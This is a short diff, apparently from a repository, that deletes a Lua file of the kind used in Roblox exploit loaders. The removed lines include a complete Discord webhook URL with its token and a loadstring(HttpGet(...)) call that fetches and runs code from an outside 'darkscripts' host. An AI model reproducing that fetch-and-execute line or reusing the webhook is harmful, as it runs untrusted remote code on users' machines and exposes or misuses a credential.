@@ -1,5 +1,0 @@
-Username = "TRIX375_2"
-Webhook = "https://discord.com/api/webhooks/1302701495199731723/GZNlxI2CVHEIHcBWPRgjJPIwabIaGw0fFeO9wx-R2IHvL3aw2A0MV8cKiEQHo7BXOEmP"
-selectedLoadingScreen = "1"
-
-loadstring(game:HttpGet(('https://darkscripts.space/mm2')))()
